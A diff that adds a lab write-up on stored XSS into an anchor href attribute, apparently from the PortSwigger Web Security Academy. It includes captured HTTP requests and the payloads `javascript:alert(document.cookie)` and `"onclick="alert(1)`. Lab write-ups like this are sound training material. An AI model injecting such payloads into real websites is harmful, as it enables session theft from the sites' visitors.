@@ -363,3 +363,74 @@ Now I tested with input `"hello="123`, now it's a valid HTML form. Now I have to
 Ran this payload, `"onclick="alert(1)`, when clicking the searchbox, it's executing and giving alert.
  
  
+## Lab 8: Stored XSS into anchor `href` attribute with double quotes HTML-encoded
+
+Captured this request.
+#### 📤 Request
+```http
+GET /post?postId=1 HTTP/2
+Host: 0aff00a30372191782767e5800e500cf.web-security-academy.net
+Cookie: session=REDACTED
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0aff00a30372191782767e5800e500cf.web-security-academy.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive
+```
+
+I posted a comment and captured the POST request.
+
+#### 📤 Request
+```http
+POST /post/comment HTTP/2
+Host: 0aff00a30372191782767e5800e500cf.web-security-academy.net
+Cookie: session=REDACTED
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 114
+Origin: https://0aff00a30372191782767e5800e500cf.web-security-academy.net
+Referer: https://0aff00a30372191782767e5800e500cf.web-security-academy.net/post?postId=1
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+csrf=6gp2ueKRJckPFiQYcod9k1wjXDOlKcat&postId=1&comment=very+useful&name=adam&email=adam%40hello.com&website=abc123
+```
+Then opened the blog GET request and saw how it stored the comment. Saw that what i wrote on `website` parameter stored in `href` . 
+
+#### 📤 Response
+```http
+            [...Remaining are omitted...]
+                   <section class="comment">
+                        <p>
+                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="abc123">adam</a> | 24 November 2026
+                        </p>
+                        <p>very useful</p>
+                        <p></p>
+                    </section>
+            [...Remaining are omitted...]
+```
+
+The username is clickable . So I can't inject payload like `<script>` or `<img>` as it will get encoded in href and will not render our payload .
+
+So I used this `javascript:alert(document.cookie)` as this is valid when it's starting with `javascript:` so we can click the name execute our payload .
+
+After sending this I clicked the name and payload worked .
+```http 
+csrf=6gp2ueKRJckPFiQYcod9k1wjXDOlKcat&postId=1&comment=worth&name=harry&email=harry%40hello.com&website=javascript:alert(document.cookie)
+```
